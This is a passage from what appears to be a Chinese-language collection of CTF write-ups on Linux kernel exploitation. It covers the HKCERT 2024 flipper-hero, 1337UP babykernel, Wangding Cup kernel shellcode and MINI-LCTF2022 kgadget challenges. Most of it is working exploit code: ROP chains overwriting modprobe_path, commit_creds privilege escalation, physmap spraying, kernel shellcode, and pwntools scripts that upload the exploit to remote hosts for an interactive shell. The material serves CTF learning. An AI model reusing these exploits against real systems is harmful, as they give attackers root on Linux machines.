&amp;ptr[0x20];    i = 0;    size_t modprobe_path_offset = 0x1864fc0;    size_t pop_rdi =  kernel_base + 0xffffffff81090c80 - nokaslr_kernel_base;  // pop rdi; ret    size_t pop_rsi =  kernel_base + 0xffffffff811cc553 - nokaslr_kernel_base;  // pop rsi; ret    size_t mov_rsi =  kernel_base + 0x7c550;  // native_set_pte    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + 0xc00ff0 + 0x36;    // cat gadget.txt | grep \" \\[rdi\\], rsi\" |grep \"ret;\"    char target[] = \"/tmp/e1\\x00\";    ropchain[i++] = pop_rdi;    ropchain[i++] = kernel_base + modprobe_path_offset;    ropchain[i++] = pop_rsi;    ropchain[i++] = *(size_t*)target;    ropchain[i++] = mov_rsi;    ropchain[i++] = swapgs_restore_regs_and_return_to_usermode;    ropchain[i++] = 0;    ropchain[i++] = 0;    ropchain[i++] = &amp;modprobe_rce;    ropchain[i++] = user_cs;    ropchain[i++] = user_rflags;    ropchain[i++] = user_sp;    ropchain[i++] = user_ss;    i = 0;    while (i &lt; 0x100)        ((uint8_t *)ropchain)[i++] ^= 0xF9;    ioctl(fd, edit, ptr);}extern void _start(){    size_t env[0];    environ = &amp;env[4];    doMain();    syscall64(60,0);}‍‍问题及感想1  有点时候会这样，参数对比上​​‍  nop 这里call 即可有助于分析​​​​‍问题及感想2‍  ropper 找到地用不了？(注意gadget 是不是在可执行段)➜  Kylin_Driver ropper --file ./vmlinux --nocolor &gt; gadget.txt➜  Kylin_Driver cat gadget.txt|grep \": mov qword ptr \\[rdi\\], rsi\" |grep \"ret\"0xffffffff830f8f30: mov qword ptr [rdi], rsi; mov dword ptr [rdx], eax; mov eax, 1; ret;0xffffffff830a47ac: mov qword ptr [rdi], rsi; mov qword ptr [r9 - 8], rcx; ret;0xffffffff830b39ea: mov qword ptr [rdi], rsi; ret;​​‍  ​native_set_pte​ 有一个 mov [rdi], rsi​， 这个 ropper 没找到0xffffffffa0e7c550 &lt;native_set_pte&gt;: mov    QWORD PTR [rdi],rsi‍‍‍flipper-hero2024-11-09-HKCERT CTF 2024 (Qualifying Round)‍nokaslr任意地址内容异或‍​​‍‍l = [1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80]MAX_DEPTH = len(l)def f(src, dst, path, sd, depth, used):    if depth &gt; MAX_DEPTH:        return None  # 超过最大递归深度时返回 None    if src == dst:        return path  # 返回成功的路径    best_path = None    for xor_value in l:        if xor_value not in used:            new_src = src ^ xor_value            new_used = used.copy()            new_used.add(xor_value)            result = f(new_src, dst, path + [xor_value], sd ^ xor_value, depth + 1, new_used)            if result:                if best_path is None or len(result) &lt; len(best_path):                    best_path = result  # 更新最优路径    return best_path  # 返回最优路径# 示例：将字符串从 '/sbin/modprobe' 转换为 '/tmp/e1\\x00's = list(b'/sbin/modprobe')d = list(b'/home/ctf/e1\\x00')for i in range(len(d)):    best_path = f(s[i], d[i], [], 0, 0, set())    e = []    print(f'me_buf.ptr = target+{i};');    for x in best_path:        print(f'''me_buf.idx = {l.index(x)};ioctl(fd,0x13370001,&amp;me_buf);''')‍exploit-c  exploit#define _GNU_SOURCE#include \"minilib.h\"void modprobe_rce(){    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /root/flag.txt\\n' &gt; /home/ctf/e1\");    system(\"chmod +x /home/ctf/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /home/ctf/e2\");    system(\"chmod +x /home/ctf/e2\");}struct buf{size_t ptr;int idx;};int doMain(){    size_t target = 0xffffffff82dd4940;    int fd = open(\"/dev/flipper_hero\",2);    struct buf me_buf;    //int xor_list    // 0x01 0x02 0x04 0x08 0x10 0x20 0x40 0x80    me_buf.ptr = target+1;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 4;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+2;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+3;    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+4;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+5;    me_buf.ptr = target+6;    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+7;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 4;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+8;    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+9;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 4;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 6;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+10;    me_buf.idx = 0;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 4;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+11;    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 2;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 3;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 4;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 6;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.ptr = target+12;    me_buf.idx = 1;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 5;    ioctl(fd,0x13370001,&amp;me_buf);    me_buf.idx = 6;    ioctl(fd,0x13370001,&amp;me_buf);    modprobe_rce();    return 0;}extern void _start(){    doMain();    syscall64(60,0);}‍exploit-remte‍cat remote_exp.py from pwn import *from base64 import b64encodecontext.log_level = 'debug's       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)rl      = lambda                    :io.recvline()ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))cmd = './run.sh'#io = process(cmd.split(' '))#io = remote('192.168.100.23',32773)io = remote(\"c51-flipper-hero-t100484-ktcenglta6bbwnizrsnwexgl.hkcert24.pwnable.hk\", 1337, ssl=True)ru('/ $ ')sl('id')ru('/ $ ')#ru('id=1000 gid=1000 groups=1000\\r\\n')exp = b64encode(open('exploit','rb').read()).decode()line_length = 76 * 2explist = [exp[i:i+line_length] for i in range(0, len(exp), line_length)]for i in explist:    cmd = f'echo -n {i}| base64 -d &gt;&gt; /home/ctf/exp'    #print(cmd)    sl(cmd)    ru('/ $ ')sl('id')#ru('id=1000 gid=1000 groups=1000\\r\\n')ru('/ $ ')while(1):    cmd =input(\"&gt;&gt;&gt; \")    print(cmd.encode())    s(cmd)    data = b''    while(1):        d = io.recv(timeout=1)        if d==b'':            break        data += d    try:        print(data.decode().replace('\\r',''))    except:        print(data)    #print(ru('~ $ ').decode().replace('\\r',''))io.interactive()‍‍‍‍babykernel‍2024-11-16-1337UP LIVE CTF‍‍保护‍  启动参数 kaslr 保护qemu-system-x86_64 \\    -m 64M \\    -kernel ./bzImage \\    -initrd ./rootfs.cpio \\    -append \"console=ttyS0 oops=panic panic=1 quiet loglevel=3 kpti=off kaslr\" \\    -nographic \\    -no-reboot \\    -monitor /dev/null‍  init#!/bin/shexport PS1='\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '[ -d /dev ] || mkdir -m 0755 /dev[ -d /sys ] || mkdir -m 0755 /sys[ -d /proc ] || mkdir -m 0755 /proc[ -d /etc ] || mkdir -m 0755 /etcecho 'root:x:0:0:root:/root:/bin/sh' &gt; /etc/passwdecho 'ctf:x:1337:1337:ctf:/home/ctf:/bin/sh' &gt;&gt; /etc/passwdecho 'root:x:0:' &gt; /etc/groupecho 'ctf:x:1337:' &gt;&gt; /etc/groupchmod 644 /etc/passwdchmod 644 /etc/groupchown -R root:root /chmod 700 -R /rootchmod 700 -R /baby.kochown -R ctf:ctf /home/ctfchmod 755 /home/ctfchmod 755 /devhostname intigritimount -t sysfs -o nodev,noexec,nosuid sysfs /sysmount -t devtmpfs -o nosuid,mode=0755 udev /devmount -t proc -o nodev,noexec,nosuid proc /procecho 2 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrict # /不能使用 dmesg 命令FLAG=$(head -n 100 /dev/random | sha256sum | awk '{printf $1}')mv /flag /root/$FLAGchmod 0400 /root/$FLAGinsmod /baby.komknod -m 666 /dev/baby c $(cat /proc/devices | grep baby | awk '{print $1}') 0echo -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\" echo \"[ Baby kernel - Intigriti ]\"cd /home/ctfsetsid cttyhack setuidgid 1337 shumount /proc umount /syspoweroff -d 0 -n -f‍ko分析‍  主要就连个功能 read 和 write,size_t __fastcall baby_read(__int64 a1, void *a2, size_t a3){  _QWORD src[51]; // [rsp+20h] [rbp-198h] BYREF  src[50] = __readgsqword(0x28u);  memset(src, 0, 400);  if ( a3 &gt; 0x190 ) // 只是判断是不是大于 0x190 ,但是没有做出限制    printk(&amp;unk_3F8);  memcpy(a2, src, a3);  return a3;}size_t __fastcall baby_write(__int64 a1, const void *a2, size_t a3){  _QWORD dest[51]; // [rsp+20h] [rbp-198h] BYREF  dest[50] = __readgsqword(0x28u);  memset(dest, 0, 400);  if ( a3 &gt; 0x190 )    printk(&amp;unk_3F8);  memcpy(dest, a2, a3);  return a3;}‍  通过 read 从 stack 泄露 kernel 地址 和 canary  再通过 write 进行 kernl 栈溢出，ROP‍exploit‍#include \"minilib.h\"char flag[0x50] = {0};size_t nokaslr_kernel_base  = 0xffffffff81000000;size_t commit_creds         = 0xffffffff810c5010;size_t prepare_kernel_cred  = 0xffffffff810c5270;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    system(\"/bin/sh\");    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;void modprobe_rce(){    system(\"echo -ne '#!/bin/sh\\n/bin/chmod -R 777 /root\\n' &gt; /home/ctf/e1\");    system(\"chmod +x /home/ctf/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /home/ctf/e2\");    system(\"chmod +x /home/ctf/e2\");}void doMain(){    save_status();    char procn[0x30] = \"/dev/baby\";    int fd = open(procn,2);    size_t buf[0x300/8];    read(fd,buf,0x200);      hexdump(buf,0x300);    size_t canary = buf[0x190/8];    size_t kernel_base = buf[0x198/8] - 0x1ca727;    lss(\"kernel_base\", kernel_base);    lss(\"canary\", canary);    size_t pop_rdi = kernel_base + (0xffffffff8100279a - nokaslr_kernel_base); // pop rdi; ret;    size_t pop_rsi = kernel_base + (0xffffffff81001b15 - nokaslr_kernel_base); // pop rsi; ret;    size_t mov_rsi = kernel_base + (0xffffffff8117b6b7 - nokaslr_kernel_base); //0xffffffff8117b6b7: mov qword ptr [rsi], rdi; ret;;    size_t modprobe_path = kernel_base + (0xffffffff82444a40 - nokaslr_kernel_base);    size_t swapgs_restore_regs_and_return_to_usermode = kernel_base + (0xffffffff81c00aa0 - nokaslr_kernel_base);    size_t ropchain[0x250/8];    char target1[] = \"/home/ct\";    char target2[] = \"f/e1\\x00\";    int i = 0x190/8;    ropchain[i++] = canary;    ropchain[i++] = pop_rsi;    ropchain[i++] = modprobe_path;    ropchain[i++] = pop_rdi;    ropchain[i++] = *(size_t*)target1;    ropchain[i++] = mov_rsi;    ropchain[i++] = pop_rsi;    ropchain[i++] = modprobe_path+8;    ropchain[i++] = pop_rdi;    ropchain[i++] = *(size_t*)target2;    ropchain[i++] = mov_rsi;    ropchain[i++] = swapgs_restore_regs_and_return_to_usermode;    ropchain[i++] = 0;    ropchain[i++] = 0;    ropchain[i++] = &amp;modprobe_rce;    ropchain[i++] = user_cs;    ropchain[i++] = user_rflags;    ropchain[i++] = user_sp;    ropchain[i++] = user_ss;    write(fd,ropchain,0x250);}extern void _start(){    size_t env[0];    environ = &amp;env[4];    doMain();    syscall64(60,0);}‍  远程from pwn import *from base64 import b64encodecontext.log_level = 'debug's       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)rl      = lambda                    :io.recvline()ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))cmd = './run.sh'#io = process(cmd.split(' '))#io = remote('192.168.100.23',32773)io = remote('babykernel.ctf.intigriti.io',1343)ru('$ ')sl('id')ru('$ ')#ru('id=1000 gid=1000 groups=1000\\r\\n')exp = b64encode(open('exploit','rb').read()).decode()line_length = 76 * 3explist = [exp[i:i+line_length] for i in range(0, len(exp), line_length)]for i in explist:    cmd = f'echo -n {i}| base64 -d &gt;&gt; /home/ctf/exp'    #print(cmd)    sl(cmd)    ru('$ ')sl('id')#ru('id=1000 gid=1000 groups=1000\\r\\n')ru('$ ')while(1):    cmd =input(\"&gt;&gt;&gt; \")    print(cmd.encode())    s(cmd)    data = b''    while(1):        d = io.recv(timeout=1)        if d==b'':            break        data += d    try:        print(data.decode().replace('\\r',''))    except:        print(data)    #print(ru('~ $ ').decode().replace('\\r',''))io.interactive()‍​​‍‍2024网鼎杯-半决赛-系统内核漏洞挖掘‍附件‍‍  server.pyfrom Cryptodome.Cipher import AESfrom Cryptodome.Util.Padding import pad, unpadimport osimport subprocessimport base64def readuntil(process, until_text):    while True:        output = readline(process)        if any(substring in output for substring in until_text):            break              return outputdef readline(process):    return process.stdout.readline()def process_qemu(code, start_script):    process = subprocess.Popen([start_script], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=0)      readuntil(process, [\"Input ur b64_code: \\n\", \"Power down\"])      process.stdin.write(code+\"\\n\")      result = readuntil(process, [\"result\", \"Power down\"])      if \"result\" in result:        return result.split(\"result: \", 1)[1]    else:        return \"dummydummydummy\\n\"  if __name__ == '__main__':    print(\"Welcome to Generic Linux kernel shellcode Challenge\")    code = input(\"Input ur b64_code: \\n\")      print(\"Virtual 1 Working......\")      os.chdir(\"./vir1\")    key = process_qemu(code, \"./vir1_start.sh\").replace('\\n', '').encode(\"ascii\")    print(\"Virtual 1 Finished\")      print(\"Virtual 2 Working......\")    os.chdir(\"../vir2\")    cipher_b64 = process_qemu(code, \"./vir2_start.sh\").replace('\\n', '').encode(\"ascii\")    print(\"Virtual 2 Finished\")      print(\"Calc ur result......\")    print('cipher: ',cipher_b64)    print('key: ', key)    if cipher_b64.find(b\"dummy\")!=-1 or key.find(b\"dummy\")!=-1:        print(\"Bad kernel shellcode\")    else:        cipher_raw = base64.b64decode(cipher_b64)        cipher = AES.new(key, AES.MODE_ECB)        decrypted = cipher.decrypt(cipher_raw).rstrip(b'\\x00').decode(\"ascii\")              print(\"Nice kernel shellcode\")        print(decrypted)‍‍​​‍‍      大概就是用一个shellcode(base64编码) 去打 两个 kernl        启动server.py 后执行的程序  int main(int argc, const char **argv, const char **envp){  int v4; // [rsp+8h] [rbp-18h]  int v5; // [rsp+Ch] [rbp-14h]  int v6; // [rsp+10h] [rbp-10h]  int v7; // [rsp+14h] [rbp-Ch]  int fd; // [rsp+18h] [rbp-8h]  int v9; // [rsp+1Ch] [rbp-4h]  puts(\"Input ur b64_code: \");  v9 = read(0, &amp;code, 0x1000uLL);  fd = open(\"/tmp/b64_code\", 66);  write(fd, &amp;code, v9);  close(fd);  system(\"chmod 622 /tmp/b64_code &amp;&amp; base64 -d /tmp/b64_code &gt; /tmp/code\");  v7 = open(\"/tmp/code\", 0);  v6 = read(v7, &amp;code, 0x1000uLL);  close(v7);  v5 = open(\"/proc/kernel_shell\", 0);  read(v5, &amp;code, v6);\t\t// 内核shellcode 提权  v4 = open(\"/flag\", 0); // root 用户可读  if ( v4 &lt; 0 )  {    puts(\"result: dummydummydummy\");    exit(-1);  }  read(v4, flag, 0x100uLL);  printf(\"result: \");  puts(flag);  return 0;}‍  vir1  flag 文件存着 aes key  vir2 flag 文件存着 aes 密文‍其他信息‍kernel 均在 6.x 以上，‍  启动命令， 开了 kaslr 地址随机化，#!/bin/bashexec qemu-system-x86_64 \\\t-m 64M \\\t-kernel ./bzImage \\\t-initrd ./rootfs.cpio \\\t-append \"console=ttyS0 kaslr quiet\" \\\t-cpu kvm64,+smap,smep\\\t-smp cores=1,threads=1 \\\t-nographic \\\t-no-reboot思考‍  整体不难，主要是kernel 题做得少，经验不足比赛中没做出来  大部分思路在这​​‍exploit‍from pwn import *context.arch = 'amd64'sc = '''mov rbx, qword ptr gs:[0x2a100]cmp rbx,0   /*vir2 取到是空的，由此用来判断是哪台靶机，执行不同的shellcode*/je v2add rbx,0x700mov rdi,[rbx]mov qword ptr [rdi + 0x04],0mov qword ptr [rdi + 0x0C],0mov qword ptr [rdi + 0x14],0mov qword ptr [rdi + 0x1C],0sub rbx, 0x38mov rbx, [rbx]sub rbx, 0x118c00add rbx, 0x800092 /* return */push rbxretv2:mov rbx, qword ptr gs:[0x2a7c0]add rbx,0x700mov rdi,[rbx]mov qword ptr [rdi + 0x04],0mov qword ptr [rdi + 0x0C],0mov qword ptr [rdi + 0x14],0mov qword ptr [rdi + 0x1C],0sub rbx, 0x38mov rbx, [rbx]sub rbx, 0x136f60add rbx, 0xa00134 /* return */push rbxret'''sc = asm(sc)print(b64e(sc))‍‍MINI-LCTF2022-kgadget–ret2dir分析题目  ​nokaslr​qemu-system-x86_64 \\\t-m 256M \\\t-cpu kvm64,+smep,+smap \\\t-smp cores=2,threads=2 \\\t-kernel bzImage \\\t-initrd ./rootfs.cpio \\\t-nographic \\\t-monitor /dev/null \\\t-snapshot \\\t-append \"console=ttyS0 nokaslr pti=on quiet oops=panic panic=1\" \\\t-no-reboot \\\t-s‍​param​ 传入一个指针，后面后 call 这个指针里存的地址‍​​‍调试分析‍  在用户态构造大量的 page, 然后可以在 kernel direct mapping​ 找到我们的数据​​  关键代码void physmap_spary(){        int i = 0, j = 0;        size_t* rop;        for (i = 0; i &lt; 15000; i++)        {                rop = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);                for (j = 0; j &lt; 4096/8; j++) rop[j] = 0xbeefbeef;        }}......__asm__(        \"mov r15, 0x1111;\"        \"mov r14, 0x2222;\"        \"mov r13, 0x3333;\"        \"mov r12, 0x4444;\"        \"mov r11, 0x5555;\"        \"mov r10, 0x6666;\"        \"mov r9,  0x7777;\"        \"mov r8,  0x8888;\"        \"mov rcx, 0x9999;\"        \"mov rbx, 0xaaaa;\"        \"mov rdx, 0xffff888000000000+0x6000000;\" // 这里        \"mov rsi, 0x1BF52;\"        \"mov rdi, fd;\"        \"mov rax, 0x10;\"        \"syscall;\"        );仅仅控制 一个 RIP 是不能够 达到提权的的，我们需要利用现有的信息​​‍  r9 和 r8 寄存器的值​​‍  拟  如果执行的是 add rsp,0xc0, 然后 0x7777 处是 pop rsp;ret   0x8888 是新的stack 那岂不是可以直接 ROP 了‍‍exploit-text  测试​​  exp.c#include \"minilib.h\"char flag[0x50] = {0};int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status(){    asm volatile (        \"mov user_cs, cs;\"        \"mov user_ss, ss;\"        \"mov user_sp, rsp;\"        \"pushf;\"        \"pop user_rflags;\"    );    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");}static void get_root_shell(){    int uid = getuid();    hex(uid);    system(\"/bin/sh\");    //chmod(\"/flag\",0777);    syscall64(60,0);}static size_t shell_addr = &amp;get_root_shell;static void shellcode(){    asm volatile (        \"xor rdi, rdi;\"        \"mov rcx, prepare_kernel_cred;\"        \"call rcx;\"        \"mov rcx, commit_creds;\"        \"call rcx;\"        // swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp    );    // restore_flags    asm volatile (        \"nop;\"        \"nop;\"        \"push user_ss;\"        \"push user_sp;\"        \"push user_rflags;\"        \"push user_cs;\"        \"push shell_addr;\"        \"swapgs;\"        \"iretq;\"    );}size_t sc_addr = &amp;shellcode + 8;void modprobe_rce(){    system(\"echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag\\n' &gt; /tmp/e1\");    system(\"chmod +x /tmp/e1\");    system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/e2\");    system(\"chmod +x /tmp/e2\");    system(\"/tmp/e2\");      // sh: /tmp/e2: Permission denied    system(\"/tmp/e2\");      // ./tmp/e2: line 1: : not found    system(\"cat /flag\");    system(\"cat /flag\");}size_t pop_rsp_ret  = 0xffffffff811483d0;size_t add_rsp_0xC0 = 0xffffffff81488561; // cat gadget.txt |grep \"add rsp, 0xa8\", pop x N;retvoid physmap_spary(){        int i = 0, j = 0;        size_t* rop;        for (i = 0; i &lt; 15000; i++)        {                rop = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);                int j = 0;                rop[j++] = add_rsp_0xC0;                rop[j++] = 0x11;                rop[j++] = 0x22;                rop[j++] = 0x33;                rop[j++] = 0x44;                rop[j++] = 0x55;                rop[j++] = 0x66;                rop[j++] = 0x77;        }}void doMain(){    save_status();    char procn[0x30] = \"/dev/kgadget\";    fd = open(procn,2);    physmap_spary();     __asm__(        \"mov r15, 0x1111;\"        \"mov r14, 0x2222;\"        \"mov r13, 0x3333;\"        \"mov r12, 0x4444;\"        \"mov r11, 0x5555;\"        \"mov r10, 0x6666;\"        \"mov r9,  pop_rsp_ret;\"        \"mov r8,  0xffff888000000000 + 0x6000000 + 8;\"        \"mov rcx, 0x9999;\"        \"mov rbx, 0xaaaa;\"        \"mov rdx, 0xffff888000000000+0x6000000;\"        \"mov rsi, 0x1BF52;\"        \"mov rdi, fd;\"        \"mov rax, 0x10;\"        \"syscall;\"        );}extern void _start(){    size_t env[0];    environ = &amp;env[4];    doMain();    syscall64(60,0);}  MakefileCC = gccCFLAGS = -nostdlib -ffunction-sections -fdata-sections -Wl,--gc-sections -fpie -static -ffreestanding -std=c++2a -mno-sse -mno-mmx -mno-avx -masm=intelexploit: exp.c\t$(CC) $(CFLAGS) $&lt; -o $@  minilib.h#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#define O_RDONLY    0   /* Open read-only.  */#define O_WRONLY    1   /* Open write-only.  */#define O_RDWR      2   /* Open read/write.  */#define O_CREAT     0x40/* New File. */#define PROT_NONE      0#define PROT_READ      1#define PROT_WRITE     2#define PROT_EXEC      4#define PROT_GROWSDOWN 0x01000000#define PROT_GROWSUP   0x02000000#define MAP_ANONYMOUS\t0x20#define MAP_SHARED\t0x01\t\t/* Share changes.  */#define MAP_PRIVATE\t0x02\t\t/* Changes are private.  */size_t environ;// bind_core#define MAX_CPUS 1024typedef struct { unsigned long bits[MAX_CPUS / (8 * sizeof(unsigned long))]; } cpu_set_t;static void CPU_ZERO(cpu_set_t *set) { for (int i = 0; i &lt; MAX_CPUS / (8 * sizeof(unsigned long)); i++) { set-&gt;bits[i] = 0; } }static void CPU_SET(int core, cpu_set_t *set) {    int idx = core / (8 * sizeof(unsigned long));    int offset = core % (8 * sizeof(unsigned long));    set-&gt;bits[idx] |= (1UL &lt;&lt; offset);}int syscall64(){    asm volatile (        \"mov rax, rdi;\"        \"mov rdi, rsi;\"        \"mov rsi, rdx;\"        \"mov rdx, rcx;\"        \"mov r10, r8 ;\"        \"mov r8 , r9 ;\"        \"mov r9 , [rsp + 8];\"        \"syscall;\"    );}size_t mmap(){    // size_t addr, size_t len, size_t prot, size_t flags, int fd, size_t offset    asm volatile (        \"mov rax, 0x9;\"        \"mov r10, rcx;\"        \"syscall;\"    );}//void *mmap(void *addr, size_t length, int prot, int flags, int fd, long int offset) {//    return (void *)syscall64(9, addr, length, prot, flags, fd, offset);//}int open(char *file,int prot){    return syscall64(2, file, prot);}int read(int fd, char *buf, int length){    return syscall64(0, fd, buf, length);}int write(int fd, char *buf, int length){    return syscall64(1, fd, buf, length);}int ioctl(int fd, size_t cmd, char *buf){    return syscall64(0x10, fd, cmd, buf);}size_t execve(char *cmd, size_t* args, char *environ){    return syscall64(0x3b, cmd, args, environ);}int sendfile(size_t dst_fd, size_t src_fd, size_t offset, size_t count){    syscall64(0x28, dst_fd, src_fd, offset, count);}int chmod(char *file,int mode){ return syscall64(0x5a, file, mode, 0);}int fork(){return syscall64(57, 0, 0, 0);}static size_t getuid(){return syscall64(0x66, 0, 0, 0);}static size_t getpid(){return syscall64(0x27, 0, 0, 0);}static int sched_setaffinity(size_t pid, size_t cpusetsize, const cpu_set_t *cupset){    return syscall64(0xcb, pid, cpusetsize, cupset);}static void bind_core(int core){    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(core, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);}static void system(char *command){    int pid = fork();    if(pid&gt;0){        char *argv[] = {\"sh\", \"-c\", command, NULL, NULL};        execve(\"/bin/sh\", argv, environ);    }}void puts(char * Str){    int length=0;    while(Str[length]!=0){++length;}    write(1,Str,length);    write(1,\"\\n\",1);}void hex(size_t IntHex){    char buf[0x20]={0};    size_t idx = 0x18;    while (idx &gt; 1) {        buf[idx] = \"0123456789ABCDEF\"[IntHex &amp; 0xF];        IntHex &gt;&gt;= 4;        if(IntHex==0){            buf[idx-2]='0';            buf[idx-1]='x';            break;        }        idx--;    }    puts(&amp;buf[idx]-2);}void lss(char * Str, size_t IntHex){    int length=0;    while(Str[length]!=0){++length;}    write(1,Str,length);    write(1,\"\\t = \",3);    hex(IntHex);}void hex_num(size_t IntHex,size_t idx){    char buf[0x20]={0};    while (idx &gt; 0) {        buf[idx] = \"0123456789ABCDEF\"[IntHex &amp; 0xF];        IntHex &gt;&gt;= 4;        idx--;    }    write(1,&amp;buf,0x18);}uint64_t byte_to_long(char *b, size_t byte_len) {    uint64_t value = 0;    size_t i;    if (byte_len &gt; sizeof(uint64_t)) {        byte_len = sizeof(uint64_t);    }    for (i = 0; i &lt; byte_len; i++) {        value &lt;&lt;= 8;        value |= (uint8_t)b[byte_len - 1 - i];    }    return value;}// strings.hvoid strncpy(char dst[], char src[], size_t n){    size_t i;    for(i = 0; i &lt; n ; i++){        dst[i] = src[i];    }    dst[i] = '\\x00';}void *strcat(char * dest, const char * src){    char *tmp = dest;    while (*dest)        dest++;    while ((*dest++ = *src++) != '\\0')        ;    return tmp;}void * malloc(size_t size){    return mmap(0, 0x1000, 3, 33, -1, 0);}void memset(void *s, int c, size_t n){    char *xs = s;    while (n--)        *xs++ = c;    return s;}char * repeat(char *ptr, char c,size_t n){    memset(ptr, c, n);    return ptr;}void hexdump(unsigned char *text, size_t size){    const size_t row_size = 16;    int i,j;    for (i = 0; i &lt; size; i += row_size) {        hex_num(i,8);        write(1,\"  \", 2);        for (j = 0; j &lt; row_size &amp;&amp; i + j &lt; size; j++) {                hex_num((unsigned char)text[i + j], 2);                write(1,\" \", 1);        }        for (; j &lt; row_size; j++) {            write(1,\"   \",3);        }        write(1,\"  |\",3);        for (j = 0; j &lt; row_size &amp;&amp; i + j &lt; 